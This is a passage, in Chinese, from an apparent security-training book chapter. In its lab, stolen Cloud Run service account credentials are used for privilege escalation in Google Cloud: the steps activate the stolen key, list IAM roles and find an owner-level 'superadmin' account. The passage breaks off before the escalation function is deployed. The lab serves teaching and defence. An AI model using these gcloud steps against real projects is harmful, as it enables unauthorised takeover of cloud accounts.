

```
WARNING: This command is using service account impersonation. All API calls will be executed as [superadmin@....iam.gserviceaccount.com].
ERROR: (gcloud.iam.service-accounts.keys.create) PERMISSION_DENIED: Failed to impersonate [superadmin@....iam.gserviceaccount.com]. Make sure the account that's trying to impersonate it has access to the service account itself and the "roles/iam.serviceAccountTokenCreator" role. Permission 'iam.serviceAccounts.getAccessToken' denied on resource (or it may not exist). This command is authenticated as html-to-pdf@....iam.gserviceaccount.com which is the active account specified by the [core/account] property. Impersonation is used to impersonate superadmin@....iam.gserviceaccount.com.
- '@type': type.googleapis.com/google.rpc.ErrorInfo
  domain: iam.googleapis.com
  metadata:
    permission: iam.serviceAccounts.getAccessToken
  reason: IAM_PERMISSION_DENIED
```

在此阶段，你已成功完成从受损的 Cloud Run 服务中窃取服务账号凭据的模拟。使用这些凭据后，你以服务账号身份进行了身份验证（`html-to-pdf@…​.iam.gservice​ac⁠count.com`），并检查是否可以直接冒充具有提升权限的其他服务账号（例如 `superadmin@…​.iam.gserviceaccount.com`），而无需所需的权限。正如你在以下各节中将看到的那样，在满足某些条件后，攻击者可以通过各种技术和方法提升权限。我们将在本章中介绍其中几种。

# 通过 Cloud Run 函数提升权限

在云环境中，如果满足某些条件，例如存在授予过度权限的 IAM 角色配置错误或暴露具有特定权限集的服务账号凭据，攻击者可以提升权限。攻击者可以使用众多技术成功提升权限，从启动新的计算或无服务器资源到利用身份和访问配置错误。

在本节中，你将探索攻击者如何通过启动新的 Cloud Run 函数并将其与具有更高权限的服务账号关联来进行权限提升。通过此新的 Cloud Run 函数，攻击者可以为具有提升权限的服务账号获取访问令牌，然后使用它以该服务账号身份进行身份验证。一旦以具有更高权限的服务账号身份进行身份验证，攻击者就可以以与服务账号的 IAM 角色分配允许的相同访问级别进行操作。

如 [Figure 10-3](#ch10.html#ch10-privilege-escalation-through-a-cloud-run-function) 所示，本节中你将执行的模拟从使用受损的 `html-to-pdf@…​.iam.gserviceaccount.com` 服务账号部署新的 Cloud Run 函数并将其与 `superadmin@…​.iam.gserviceaccount.com` 服务账号关联开始。然后你将从已部署的函数资源中获取访问令牌，并使用它为 `superadmin@…​.iam.gserviceaccount.com` 生成服务账号密钥以进行身份验证。

![](assets/lsse_1003.png)

###### Note

本节假设你正在使用攻击者账号，即你一直在用来模拟攻击者对托管在 Serverless Lab 账号中的无服务器实验室环境执行操作的账号。

让我们继续进行权限提升模拟：

1. 导航到 Cloud Shell 环境的主目录，然后打印 `run-key.json` 文件中的 JSON 值：

```
cd ~
    
cat run-key.json
```

这会产生以下输出：

```
{
  "type": "service_account",
  "project_id": "...",
  "private_key_id": "...",
  "private_key": "...",
  "client_email": "html-to-pdf@....iam.gserviceaccount.com",
  "client_id": "...",
  "auth_uri": "https://accounts.google.com/o/oauth2/auth",
  "token_uri": "https://oauth2.googleapis.com/token",
  "auth_provider_x509_cert_url": "https://www.googleapis.com/...",
  "client_x509_cert_url": "https://www.googleapis.com/...",
  "universe_domain": "googleapis.com"
}
```

`run-key.json` 文件包含 `html-to-pdf@…​.iam.gserviceaccount.com` 服务账号的私钥和相关凭据。

2. 使用 `run-key.json` 文件以受损 Cloud Run 服务使用的服务账号身份进行身份验证：

```
export RUN_SA_CREDENTIALS="run-key.json"
gcloud auth activate-service-account \
  --key-file=$RUN_SA_CREDENTIALS
```

你应该收到以下确认消息：

```
Activated service account credentials for:
 [html-to-pdf@....iam.gserviceaccount.com]
```

3. 通过从密钥文件检索项目 ID 来设置当前 `gcloud` 项目：

```
PROJECT_ID=$(cat run-key.json | jq -r ".project_id")
gcloud config set project $PROJECT_ID
```

4. 从密钥文件检索服务账号的电子邮件地址并将其存储在 `RUN_KEY_EMAIL` 变量中：

```
RUN_KEY_EMAIL=$(cat run-key.json | jq -r ".client_email")
echo $RUN_KEY_EMAIL
```

你应该得到以下输出：

```
html-to-pdf@....iam.gserviceaccount.com
```

5. 检查分配给服务账号的 IAM 角色以验证其权限：

```
gcloud projects get-iam-policy $PROJECT_ID \
  --flatten="bindings[].members" \
  --format='table(bindings.role)' \
  --filter="bindings.members:$RUN_KEY_EMAIL"
```

这会产生以下输出：

```
ROLE: roles/editor

ROLE: roles/iam.serviceAccountUser

ROLE: roles/run.admin
```

###### Caution

尽管没有直接冒充其他服务账号的能力，但 `roles/run.admin` 和 `roles/iam.serviceAccountUser` 角色的组合可以被攻击者利用来启动新的 Cloud Run 函数并将其与具有提升权限的现有服务账号关联。单独使用，`roles/run.admin` 仅允许管理 Cloud Run 资源，但如果没有 `roles/iam.serviceAccountUser`，则无法将服务账号附加到 Cloud Run 函数。

6. 列出当前 Google Cloud 项目中的所有服务账号：

```
gcloud iam service-accounts list
```

这会给出一个服务账号列表——包括一个电子邮件地址以 `superadmin` 开头的服务账号：

```
...

DISPLAY NAME: Cloud Run HTML to PDF Service Account
EMAIL: html-to-pdf@....iam.gserviceaccount.com
DISABLED: False

DISPLAY NAME: superadmin
EMAIL: superadmin@....iam.gserviceaccount.com
DISABLED: False
```

从显示名称（例如 `superadmin`）中，攻击者通常可以识别出哪些服务账号可能具有提升的权限，并利用它们来提升权限。

7. 复制以 `superadmin` 开头的服务账号的电子邮件地址并将其存储在 `SA_EMAIL` 变量中：

```
SA_EMAIL="[EMAIL ADDRESS]"
```

8. 检查电子邮件地址以 `superadmin` 开头的服务账号分配的 IAM 角色：

```
gcloud projects get-iam-policy $PROJECT_ID \
  --flatten="bindings[].members" \
  --format='table(bindings.role)' \
  --filter="bindings.members:$SA_EMAIL"
```

这会返回以下响应：

```
ROLE: roles/owner
```

此时，你已确定用于提升权限的服务账号。让我们继续通过设置一些先决条件并启动一个新的 Cloud Run 函数来检索与服务关联的服务账号的令牌：

1. 创建一个新目录，然后使用 `touch` 命令在目录内为 Cloud Run 函数的配置和代码创建初始空项目文件：

